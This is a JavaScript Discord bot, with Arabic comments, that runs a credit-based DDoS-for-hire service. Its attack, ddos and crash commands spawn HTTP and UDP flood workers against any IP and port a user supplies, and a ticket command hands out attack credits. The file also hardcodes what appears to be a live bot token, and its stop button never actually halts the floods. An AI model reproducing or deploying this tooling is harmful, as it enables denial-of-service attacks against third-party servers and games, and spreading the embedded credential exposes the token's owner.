const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const axios = require('axios');
const http = require('http');
const { Worker } = require('worker_threads');
const net = require('net');

// ==================== الإعدادات ====================
const TOKEN = "MTUzNjE3NTgyMTAyOTM3NjEwMQ.GNFrIC.-CSDTGG0Pba408qG4PdqZSJRAgweloYd8jmBSA"; 
const PREFIX = "!";

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

// قاعدة البيانات
let userCredits = {}; 

// ==================== المحرك القوي (The Engine) ====================

function startBeastAttack(targetIp, port, durationSeconds = 30) {
    console.log(`🚀 BEAST MODE: Attacking ${targetIp}:${port} with 10 Threads...`);
    
    let threadsActive = 0;
    const maxThreads = 10; // عدد الخوارات (زده إذا كان السيرفر قوياً)

    for (let i = 0; i < maxThreads; i++) {
        threadsActive++;
        // Thread 1: HTTP Flood (للمواقع والرومات)
        const httpWorker = new Worker('./http-flood.js');
        httpWorker.postMessage({ target: targetIp, port: port || 80, threads: 1 });
        
        // Thread 2: UDP Flood (للألعاب)
        const udpWorker = new Worker('./udp-flood.js');
        udpWorker.postMessage({ target: targetIp, port: port });
    }

    // إيقاف بعد المدة المحددة
    setTimeout(() => {
        console.log("🛑 Beast Attack Ended.");
    }, durationSeconds * 1000);
}

// ==================== أحداث الديسكورد ====================

client.on('ready', () => {
    console.log(`✅ Beast Bot is ready: ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
    if (!message.content.startsWith(PREFIX) || message.author.bot) return;

    const args = message.content.slice(PREFIX).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // أمر التذاكر (إضافة أيام)
    if (command === 'ticket') {
        const userId = args[0];
        const days = parseInt(args[1]);
        
        if (!userId || isNaN(days)) {
            const embed = new EmbedBuilder().setColor('#FF0000').setTitle('❌ خطأ').setDescription('الاستخدام: `!ticket @user 5`');
            return message.reply({ embeds: [embed] });
        }

        if (!userCredits[userId]) userCredits[userId] = 0;
        userCredits[userId] += days;

        const embed = new EmbedBuilder()
            .setColor('#00FF00')
            .setTitle('✅ تم الإضافة')
            .setDescription(`تم إضافة **${days} أيام** لـ <@${userId}>.\nالرصيد الحالي: **${userCredits[userId]}**`);
        
        message.reply({ embeds: [embed] });
    }

    // أمر الهجوم (Beast Mode)
    if (command === 'attack' || command === 'ddos' || command === 'crash') {
        const targetIp = args[0];
        const targetPort = parseInt(args[1]) || 80;
        const attackerUserId = message.author.id;

        if (!userCredits[attackerUserId] || userCredits[attackerUserId] <= 0) {
            const embed = new EmbedBuilder().setColor('#FF0000').setTitle('🚫 رصيدك انتهى').setDescription('الرصيد: 0');
            return message.reply({ embeds: [embed] });
        }

        userCredits[attackerUserId]--;

        const startEmbed = new EmbedBuilder()
            .setColor('#FFA500') // برتقالي للتحذير من القوة
            .setTitle('🦁 BEAST MODE')
            .setDescription(`**الهدف:** ${targetIp}:${targetPort}\n**القوة:** 10 Threads (UDP + HTTP)\n**الحالة:** جاري التدمير...`)
            .addFields({ name: 'المدة', value: '30 ثانية' });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('stop_beast').setLabel('إيقاف الفزع 🛑').setStyle(ButtonStyle.Danger)
        );

        const sentMsg = await message.reply({ embeds: [startEmbed], components: [row] });

        // بدء الهجوم
        startBeastAttack(targetIp, targetPort);

        // جمع الأحداث للإيقاف
        const collector = sentMsg.createMessageComponentCollector({ time: 35000 });
        collector.on('collect', async (i) => {
            if (i.customId === 'stop_beast') {
                await i.update({ 
                    embeds: [new EmbedBuilder().setColor('#FF0000').setTitle('🛑 تم إيقاف الفزع').setDescription(`الرصيد المتبقي: ${userCredits[attackerUserId]}`)], 
                    components: [] 
                });
            }
        });
    }
});

client.login(TOKEN);